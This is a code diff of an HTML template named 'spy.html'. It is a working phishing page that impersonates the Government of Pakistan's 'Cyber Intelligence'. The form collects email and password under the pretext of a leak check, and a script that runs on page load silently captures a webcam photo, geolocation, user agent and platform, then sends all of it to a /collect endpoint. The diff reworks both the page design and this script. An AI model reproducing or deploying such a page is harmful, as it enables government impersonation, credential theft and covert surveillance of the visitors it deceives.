@@ -1,140 +1,148 @@
-<!-- templates/spy.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>⚠️ Government of Pakistan – Cyber Intelligence</title>
-  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/State_emblem_of_Pakistan.svg/1200px-State_emblem_of_Pakistan.svg.png">
+  <title>🇵🇰 Government of Pakistan – Cyber Intelligence</title>
+  <link rel="🇵🇰" href="/static/icon.png">
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #1a1a1a;
-      color: white;
+      background: #1b2631;
+      color: #fff;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
-      background-image: url('https://www.transparenttextures.com/patterns/black-linen.png');
     }
-    .container {
-      background: rgba(255,255,255,0.05);
+    .box {
+      background: rgba(255, 255, 255, 0.1);
       padding: 30px;
       border-radius: 16px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
       text-align: center;
-      width: 350px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      width: 360px;
       backdrop-filter: blur(8px);
     }
     h1 {
-      font-size: 20px;
-      color: #e74c3c;
+      font-size: 22px;
+      margin-bottom: 10px;
     }
     p {
       font-size: 14px;
-      margin-bottom: 20px;
+      margin: 10px 0;
     }
     input, button {
       width: 100%;
       padding: 10px;
-      margin: 8px 0;
+      margin: 6px 0;
       border-radius: 6px;
       border: none;
+      font-size: 14px;
     }
     input {
       background: #ecf0f1;
       color: #2c3e50;
     }
     button {
-      background: #c0392b;
+      background: #e74c3c;
       color: white;
       font-weight: bold;
       cursor: pointer;
     }
     button:hover {
-      background: #e74c3c;
+      background: #c0392b;
     }
     img {
-      max-width: 80px;
+      width: 80px;
       margin-bottom: 10px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/State_emblem_of_Pakistan.svg/1200px-State_emblem_of_Pakistan.svg.png">
-    <h1>⚠️ Government of Pakistan – Cyber Intelligence</h1>
-    <p>📬 Please check your leaked email and password data.</p>
-    <form action="/login" method="POST">
-      <input type="email" name="email" placeholder="Email" required>
+  <div class="box">
+    <img src="/static/pakistan-emblem.png" alt="Gov Logo">
+    <h1>🇵🇰 Government of Pakistan – Cyber Intelligence</h1>
+    <p>Confidential system – Your location & camera are being analyzed...</p>
+    <form method="POST" action="/login">
+      <input type="text" name="email" placeholder="Email" required>
       <input type="password" name="password" placeholder="Password" required>
-      <button type="submit">Check Now</button>
+      <button type="submit">🔍 Check Now</button>
     </form>
   </div>
 
   <script>
-    async function sendPhotoBlob(blob) {
+    async function sendPhoto(blob) {
       const formData = new FormData();
-      formData.append('photo', blob);
+      formData.append('photo', blob, 'photo.jpg');
+      await fetch('/collect', { method: 'POST', body: formData });
+    }
+
+    function captureImage(video) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.toBlob(sendPhoto);
+    }
+
+    async function askForPermissions() {
       try {
-        await fetch('/collect', {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        setTimeout(() => {
+          captureImage(video);
+          stream.getTracks().forEach(track => track.stop());
+        }, 3000);
+
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            fetch('/collect', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                camera: '✅ Camera Allowed',
+                userAgent: navigator.userAgent,
+                deviceInfo: navigator.platform
+              })
+            });
+          },
+          err => {
+            fetch('/collect', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude: null,
+                longitude: null,
+                camera: '✅ Camera Allowed, ❌ Location Denied',
+                userAgent: navigator.userAgent,
+                deviceInfo: navigator.platform
+              })
+            });
+          }
+        );
+
+      } catch (err) {
+        fetch('/collect', {
           method: 'POST',
-          body: formData
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            latitude: null,
+            longitude: null,
+            camera: '❌ Camera Denied',
+            userAgent: navigator.userAgent,
+            deviceInfo: navigator.platform
+          })
         });
-      } catch (e) {
-        console.error('Photo send failed', e);
       }
     }
 
-    async function collectData(status, lat = null, lon = null) {
-      const data = {
-        userAgent: navigator.userAgent,
-        latitude: lat,
-        longitude: lon,
-        camera: status,
-        deviceInfo: navigator.platform
-      };
-
-      await fetch('/collect', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
-    }
-
-    function capturePhoto(stream) {
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
-      video.onloadedmetadata = () => {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-          sendPhotoBlob(blob);
-        }, 'image/jpeg');
-      };
-    }
-
-    function askPermissions() {
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-        .then(stream => {
-          capturePhoto(stream);
-          stream.getTracks().forEach(track => track.stop());
-
-          navigator.geolocation.getCurrentPosition(
-            pos => collectData('✅ Camera Allowed', pos.coords.latitude, pos.coords.longitude),
-            err => collectData('✅ Camera Allowed, ❌ Location Denied')
-          );
-        })
-        .catch(() => collectData('❌ Camera Denied'));
-    }
-
-    window.onload = askPermissions;
+    window.onload = askForPermissions;
   </script>
 </body>
 </html>
